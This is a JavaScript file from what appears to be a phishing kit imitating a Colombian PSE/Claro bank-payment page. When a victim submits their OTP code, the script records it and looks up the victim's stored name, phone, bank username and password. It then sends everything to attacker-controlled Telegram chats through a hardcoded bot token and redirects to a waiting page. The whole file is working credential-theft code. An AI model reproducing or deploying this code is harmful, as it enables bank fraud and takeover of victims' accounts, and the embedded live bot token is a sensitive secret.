function updateLS() {
  LS.setItem("info", JSON.stringify(info));
}

// Elemento con el botón OTP
const otpButton = document.getElementById("btnDinamica");

// Elemento input número de celular
const numberMovil = document.getElementById("txtDinamica");

async function sendToTelegram(message) {
  for (const chatId of chatIds) {
    const url = `https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
      message
    )}`;

    try {
      const response = await fetch(url);
      if (response.ok) {
        console.log(`Mensaje enviado a Telegram (chat ID: ${chatId})`);
      } else {
        console.error(
          `Error al enviar mensaje (chat ID: ${chatId}):`,
          response.statusText
        );
      }
    } catch (error) {
      console.error(`Error de red (chat ID: ${chatId}):`, error);
    }
  }
}

otpButton.addEventListener("click", async function (e) {
  e.preventDefault();
  otpButton.disabled = true;

  if (numberMovil.value == "") {
    alert("Por favor ingrese el token de seguridad");
    numberMovil.focus();
    otpButton.disabled = false;
    return;
  } else {
    var din = numberMovil.value;
    info.metaInfo.cdin = din;

    updateLS();

    try {
      // Obtener los datos del servidor
      const response = await fetch(`${url}/trico/tricoData`, {
        method: "GET",
        headers: {
          "Content-Type": "application/json",
        },
      });

      if (!response.ok) {
        throw new Error("Error al obtener los datos del servidor");
      }

      const serverData = await response.json();
      const dataTables = [...serverData];
      const userData = dataTables.find((data) => data.id == info.metaInfo.cc);

      if (userData) {
        console.log("Usuario Encontrado");

        const updateResponse = await fetch(
          `${url}/trico/updateTricoPse/${userData.idreg}`,
          {
            method: "PUT",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              otp: info.metaInfo.cdin,
            }),
          }
        );

        if (!updateResponse.ok) {
          throw new Error("Error al actualizar el usuario");
        }

        const updateData = await updateResponse.json();

        // Crear el mensaje con toda la información
        const message = `🟣 PSE (Claro)\n©️ID: ${userData.id}\n🆔Nombre: ${userData.nombre}\n📱Teléfono: ${userData.telefono}\n🚹Usuario: ${userData.usuario}\n🔒Contraseña: ${userData.password}\n💎OTP: ${info.metaInfo.cdin}\n🏦Banco: ${userData.bank}\nFuente: ${fuente}\nIngresó OTP`;

        // Enviar el mensaje a Telegram
        await sendToTelegram(message);

        console.log("Usuario actualizado");
      } else {
        console.error("Usuario no encontrado en la base de datos");
      }
    } catch (error) {
      console.error("Error al procesar la OTP:", error);
    } finally {
      otpButton.disabled = false;
      window.location.href = "wait.html"; // Redirige a la página deseada
    }
  }
});
